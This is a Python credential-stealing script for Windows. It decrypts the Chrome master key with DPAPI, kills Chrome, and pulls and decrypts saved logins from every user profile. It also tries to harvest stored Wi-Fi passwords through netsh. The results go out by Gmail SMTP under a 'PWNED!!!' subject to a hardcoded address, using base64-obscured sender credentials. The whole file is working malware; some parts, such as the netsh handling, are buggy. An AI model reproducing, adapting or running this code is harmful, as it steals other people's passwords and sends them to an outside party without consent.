import os
import time
import sqlite3
import json
import base64
import shutil
from datetime import datetime, timedelta
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome
from sqlite3 import Error
from pathlib import Path
import smtplib
import subprocess
import re



username = 'a2E0bWFsZWFybmVyQGdtYWlsLmNvbQ=='
password = 'QEtleWFhbjc4Ng=='

try:
	users = [x.name for x in Path(r'C:\Users').glob('*') if x.name not in ['Default', 'Default User', 'Public', 'All Users'] and x.is_dir()]
except:
	print('error getting usernames')



def wifi():
	
		message = '-'*100 + '\n'*2
		command_output = os.system("netsh wlan show profiles")
		command_output = str(command_output)

		profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

		wifilist = []

		if len(profile_names) != 0:
		    for name in profile_names:
		        wifi_profile = {}
		        profile = os.system("netsh wlan show profile name")
		        profile = str(profile)

		        if re.search("Security key           : Absent", profile):
		            continue
		        else:
		            wifi_profile["bssid"] = name
		            profile_pass = os.system(f"netsh wlan show {profile} name key=clear")
		            profile_pass = str(profile_pass)
		            password = re.search("Key Content            : (.*)\r", profile_pass)
		            if password == None:
		                wifi_profile["password"] = 'No password'
		            else:
		                wifi_profile["password"] = password[1]
		            wifilist.append(wifi_profile)
		for wifis in wifilist:
			message = message + f'Name: {wifis["bssid"]} \nPassword: {wifis["password"]}' + '\n'*2
		message = message+'-'*100
		return message




def mail(user, message, username,password, to):
	sent = False
	tried = 0
	while sent!=True and tried != 6:
		try:
			with smtplib.SMTP('smtp.gmail.com',587) as smtp:
				smtp.ehlo() # Identifies us with mail server not imp
				smtp.starttls() #encrypting the connection
				smtp.ehlo() #Identify again
				username = base64.b64decode(username)
				password = base64.b64decode(password)
				username = str(username)[2:-1]
				password = str(password)[2:-1]
				smtp.login(username, password)

				subject = f'{user} PWNED!!!'
				body = message

				msg = f'Subject: {subject}\n\n{body}'

				smtp.sendmail(username, to, msg)
				sent = True
				tried = tried + 1
		except:
			pass

def broswer_creds(db_file, encrypted_key):
	try:
		conn = None
		output = os.system("taskkill", "/IM", "chrome.exe", "/F")
		time.sleep(2)
		conn = sqlite3.connect(db_file)
		#print('connected to:' ,db_file)
		message = '-'*100 + '\n'*2
		cursor = conn.cursor()
		cursor.execute("SELECT action_url, username_value, password_value FROM logins")
		for index,login in enumerate(cursor.fetchall()):
			url = login[0]
			username = login[1]
			ciphertext= login[2]
			#print("Url:",url)
			#print("Username:",username)
			initialisation_vector = ciphertext[3:15]
			encrypted_password = ciphertext[15:-16]
			cipher = AES.new(encrypted_key, AES.MODE_GCM, initialisation_vector)
			decrypted_pass = cipher.decrypt(encrypted_password)
			decrypted_pass = decrypted_pass.decode()
			#print("Password:", decrypted_pass)
			message = message + url + '\n' + username + '\n' + decrypted_pass + '\n'*2
			#with open('browser.txt', 'a') as f:
				#f.write(url + '\n' + username + '\n' + decrypted_pass + '\n'*2)
		message = message + '-' * 100

		cursor.close()
		return message
	except:
		return ''

all_data = ''
for user in users:
	message = ''
	try:
		with open(rf'C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State', 'r') as f:
			data = f.read()
			data = json.loads(data)
			os_crypt = data['os_crypt']
			encrypted_key = os_crypt['encrypted_key']
			encrypted_key = base64.b64decode(encrypted_key)
			encrypted_key = encrypted_key[5:]
			key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
		profiles = []
		items = os.listdir(fr'C:\Users\{user}\AppData\Local\Google\Chrome\User Data')
		for item in items:
			if item.find('Profile') != -1 or item == 'Default':
				profiles.append(item)
		for profile in profiles:
			loc = f'C:/Users/{user}/AppData/Local/Google/Chrome/User Data/{profile}/Login Data'
			newmsgs =  broswer_creds(loc, key)
			message = message + newmsgs
		all_data = all_data + message
	except:
		print(f'Error before connection')



wifis = wifi()
message = message + '\n' + wifis
mail(user, message, username, password, 'keyaanminhas@gmail.com')
